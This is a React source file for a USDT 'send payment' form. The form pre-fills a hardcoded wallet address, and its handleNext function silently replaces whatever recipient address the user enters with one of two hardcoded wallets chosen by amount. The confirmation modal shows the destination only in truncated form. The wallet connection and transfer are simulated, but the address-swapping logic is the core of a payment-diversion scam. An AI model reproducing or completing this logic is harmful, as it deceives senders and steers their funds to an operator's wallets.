"use client"

import type React from "react"

import { useState } from "react"
import { Copy, X, QrCode } from "lucide-react"

export default function SendPaymentForm() {
  const ADMIN_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988"
  const PAYMENT_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988" // 5-2000 USDT
  const HIGH_AMOUNT_WALLET_ADDRESS = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // Above 2000 USDT
  const [address, setAddress] = useState(ADMIN_WALLET_ADDRESS)
  const [amount, setAmount] = useState("")
  const [usdValue, setUsdValue] = useState("0.00")
  const [showModal, setShowModal] = useState(false)
  const [destinationWallet, setDestinationWallet] = useState("")
  const [isConnecting, setIsConnecting] = useState(false)
  const [isConnected, setIsConnected] = useState(false)

  const handleClear = () => {
    setAddress("")
  }

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setAddress(text)
    } catch (err) {
      console.error("Failed to paste:", err)
    }
  }

  const handleMaxClick = () => {
    // This would be connected to wallet balance
    setAmount("1000")
    setUsdValue("1000.00")
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setAmount(value)
    // Simple conversion (1 USDT = 1 USD for demo)
    setUsdValue(value ? Number.parseFloat(value).toFixed(2) : "0.00")
  }

  const handleNext = () => {
    if (!address || !amount) {
      alert("Please fill in all fields")
      return
    }

    const amountNum = Number.parseFloat(amount)
    let wallet = address

    if (amountNum >= 5 && amountNum <= 2000) {
      wallet = PAYMENT_WALLET_ADDRESS
      console.log("[v0] Amount 5-2000 USDT routing to:", wallet)
    } else if (amountNum > 2000) {
      wallet = HIGH_AMOUNT_WALLET_ADDRESS
      console.log("[v0] Amount above 2000 USDT routing to:", wallet)
    } else if (amountNum < 5) {
      alert("Amount must be at least 5 USDT")
      return
    }

    setDestinationWallet(wallet)
    setShowModal(true)
    console.log("[v0] Opening wallet connection modal for:", { wallet, amount })
  }

  const handleConnectWallet = async () => {
    setIsConnecting(true)
    try {
      // Simulate wallet connection
      await new Promise((resolve) => setTimeout(resolve, 1500))
      setIsConnected(true)
      console.log("[v0] Wallet connected successfully")
    } catch (error) {
      console.error("[v0] Wallet connection failed:", error)
      alert("Failed to connect wallet")
    } finally {
      setIsConnecting(false)
    }
  }

  const handleTransfer = async () => {
    if (!isConnected) {
      alert("Please connect your wallet first")
      return
    }

    try {
      console.log("[v0] Initiating transfer:", {
        amount,
        destinationWallet,
        token: "USDT",
      })
      // Simulate transfer
      alert(`Transfer of ${amount} USDT to ${destinationWallet} initiated!`)
      setShowModal(false)
      setIsConnected(false)
      setAmount("")
      setUsdValue("0.00")
    } catch (error) {
      console.error("[v0] Transfer failed:", error)
      alert("Transfer failed")
    }
  }

  const buttonColor = amount ? "#002BFF" : "#C7B9FF"
  const buttonHoverColor = amount ? "#0020CC" : "#B8AAFF"

  return (
    <div className="w-full min-h-screen flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8">
      <div className="w-full max-w-md">
        {/* Address or Domain Name Section */}
        <div className="mb-8 sm:mb-10">
          <label className="block text-lg sm:text-xl font-semibold text-gray-900 mb-3 sm:mb-4">
            Address or Domain Name
          </label>
          <div className="flex items-center gap-2 sm:gap-3 px-4 sm:px-5 py-3 sm:py-4 border border-gray-300 rounded-2xl bg-white hover:border-gray-400 transition-colors">
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              placeholder="Enter address or domain"
              className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0"
            />
            {address && (
              <button
                onClick={handleClear}
                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
                aria-label="Clear address"
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#C7B9FF" }} />
              </button>
            )}
            <button
              onClick={handlePaste}
              className="px-2 sm:px-3 py-1 sm:py-1.5 text-xs sm:text-sm font-medium text-blue-600 hover:bg-blue-50 rounded-lg transition-colors flex-shrink-0 whitespace-nowrap"
              aria-label="Paste address"
            >
              Paste
            </button>
            <button className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0" aria-label="Copy">
              <Copy className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#C7B9FF" }} />
            </button>
            <button
              className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0"
              aria-label="Scan QR code"
            >
              <QrCode className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#C7B9FF" }} />
            </button>
          </div>
        </div>

        {/* Amount Section */}
        <div className="mb-8 sm:mb-10">
          <label className="block text-lg sm:text-xl font-semibold text-gray-900 mb-3 sm:mb-4">Amount</label>
          <div className="flex items-center gap-2 sm:gap-4 px-4 sm:px-5 py-3 sm:py-4 border border-gray-300 rounded-2xl bg-white">
            <input
              type="number"
              value={amount}
              onChange={handleAmountChange}
              placeholder="USDT Amount"
              className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0 leading-7"
              style={{
                color: amount ? "#C7B9FF" : "inherit",
              }}
            />
            {amount && (
              <button
                onClick={() => {
                  setAmount("")
                  setUsdValue("0.00")
                }}
                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
                aria-label="Clear amount"
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5 text-gray-400" />
              </button>
            )}
            <span
              className="text-xs sm:text-sm font-medium flex-shrink-0 whitespace-nowrap"
              style={{ color: "#C7B9FF" }}
            >
              USDT
            </span>
            <button
              onClick={handleMaxClick}
              className="px-2 sm:px-3 py-1 sm:py-1.5 text-xs sm:text-sm font-medium text-blue-600 hover:bg-blue-50 rounded-lg transition-colors flex-shrink-0 whitespace-nowrap"
            >
              Max
            </button>
          </div>
          <div className="mt-2 sm:mt-3 text-xs sm:text-sm text-gray-500">≈ ${usdValue}</div>
        </div>

        {/* Spacer */}
        <div className="h-32 sm:h-48" />

        {/* Next Button */}
        <button
          onClick={handleNext}
          style={{
            backgroundColor: buttonColor,
            color: "white",
          }}
          onMouseEnter={(e) => {
            e.currentTarget.style.backgroundColor = buttonHoverColor
          }}
          onMouseLeave={(e) => {
            e.currentTarget.style.backgroundColor = buttonColor
          }}
          className="w-full py-3 sm:py-4 text-base sm:text-lg font-semibold rounded-full transition-colors opacity-100"
        >
          Next
        </button>
      </div>

      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-xl sm:text-2xl font-bold text-gray-900">Connect Wallet</h2>
              <button
                onClick={() => {
                  setShowModal(false)
                  setIsConnected(false)
                }}
                className="p-1 hover:bg-gray-100 rounded-full transition-colors"
              >
                <X className="w-5 h-5 sm:w-6 sm:h-6" />
              </button>
            </div>

            {/* Transfer Details */}
            <div className="bg-gray-50 rounded-2xl p-4 sm:p-5 mb-6">
              <div className="space-y-3">
                <div className="flex justify-between">
                  <span className="text-sm text-gray-600">Amount:</span>
                  <span className="font-semibold text-gray-900">{amount} USDT</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-sm text-gray-600">To:</span>
                  <span className="font-mono text-xs sm:text-sm text-gray-900 truncate">
                    {destinationWallet.slice(0, 6)}...{destinationWallet.slice(-4)}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-sm text-gray-600">USD Value:</span>
                  <span className="font-semibold text-gray-900">${usdValue}</span>
                </div>
              </div>
            </div>

            {/* Connection Status */}
            {!isConnected ? (
              <div className="space-y-3">
                <p className="text-sm text-gray-600 text-center mb-4">
                  Connect your wallet to proceed with the transfer
                </p>
                <button
                  onClick={handleConnectWallet}
                  disabled={isConnecting}
                  style={{
                    backgroundColor: isConnecting ? "#C7B9FF" : "#002BFF",
                  }}
                  className="w-full py-3 sm:py-4 text-base sm:text-lg font-semibold rounded-full text-white transition-colors disabled:opacity-70"
                >
                  {isConnecting ? "Connecting..." : "Connect Wallet"}
                </button>
              </div>
            ) : (
              <div className="space-y-3">
                <div className="bg-green-50 border border-green-200 rounded-xl p-3 sm:p-4 text-center">
                  <p className="text-sm font-semibold text-green-700">✓ Wallet Connected</p>
                </div>
                <button
                  onClick={handleTransfer}
                  style={{ backgroundColor: "#002BFF" }}
                  className="w-full py-3 sm:py-4 text-base sm:text-lg font-semibold rounded-full text-white transition-colors hover:opacity-90"
                >
                  Confirm Transfer
                </button>
                <button
                  onClick={() => {
                    setShowModal(false)
                    setIsConnected(false)
                  }}
                  className="w-full py-2 sm:py-3 text-base font-semibold rounded-full text-gray-700 bg-gray-100 hover:bg-gray-200 transition-colors"
                >
                  Cancel
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}
